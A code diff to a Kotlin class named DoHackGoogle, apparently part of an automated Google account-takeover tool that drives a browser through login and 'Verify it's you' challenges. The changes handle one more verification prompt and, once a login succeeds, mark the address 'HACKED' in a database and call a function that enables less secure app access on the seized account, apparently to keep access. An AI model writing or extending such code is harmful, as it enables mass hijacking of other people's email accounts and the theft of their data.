@@ -88,6 +88,9 @@ class DoHackGoogle() {
 //                    )
                         println("AccountDisable success")
                     },
+                    VerifyItsYouAction {
+                        println("VerifyItsYouAction success")
+                    },
                     VerifyItsYouPhoneNumber {
                         //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                         println("VerifyItsYou success")
@@ -110,6 +113,7 @@ class DoHackGoogle() {
                     }
                     is PageResponse.OK -> {
                         update(email, "email_status", "HACKED")
+                        allowLessSecureApps(driver, email, collection)
                         driver.renew(Browser.firefox)
                     }
                     is PageResponse.NOT_FOUND_EMAIL -> {
